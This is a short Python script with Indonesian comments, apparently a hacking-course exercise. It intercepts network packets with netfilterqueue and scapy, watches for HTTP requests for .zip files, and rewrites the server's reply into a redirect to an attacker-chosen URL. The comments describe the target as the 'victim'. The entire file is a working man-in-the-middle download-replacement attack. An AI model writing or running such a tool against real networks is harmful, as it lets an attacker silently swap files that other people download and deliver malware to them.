import netfilterqueue # panggil method netfilterqueue
import scapy.all as scapy # panggil method scapy

ack_list = [] # declare var array/list untuk menampung value dari field ack yang ada di layer TCP

def set_load(packet, load): # membuat function untuk mengatur field load yang akan dimodifikasi
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len # delete field len pada layer IP
    del packet[scapy.IP].chksum # delete field chksum pada layer IP
    del packet[scapy.TCP].chksum # delete field chksum pada layer TCP
 
    return packet

def process_packet(packet): # funct untuk mengkonversi paket
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw): 
        if scapy_packet[scapy.TCP].dport == 80: #
            if b".zip" in scapy_packet[scapy.Raw].load: #  melakukan pengecekan jika dalam packet pada layer Raw dnegan field load ada file dengan extension .zip
                print("[+] file .zip Request")
                ack_list.append(scapy_packet[scapy.TCP].ack) # menambahkan value dari layer TCP dengan field ack ke var ack_list
        elif scapy_packet[scapy.TCP].sport == 80: # cek packet pada layer TCP dengan field sport
            if scapy_packet[scapy.TCP].seq in ack_list: # melakukan pengecekan apakah value dari field seq di layer TCP adalah sama dengan value dari ack_list 
                ack_list.remove(scapy_packet[scapy.TCP].seq)   # menghapus value dari layer TCP dengan field seq dari var ack_list
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://example.com") # memanggil function set_load dalam sebuah var untuk men-direct atau mengarahkan atau mengubah link yaang dituju korban ke link yang sudah kita siapkan (https / http).
                packet.set_payload(bytes(modified_packet)) # setting packet asli ke scapy_packet buatan 

    packet.accept() # untuk menerima / meneruskan paket ke komputer korban
   
def main():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet) # setting number queue dan panggil funct process_packet
    queue.run() # run queue
    
    return
if __name__=='__main__':
    main()
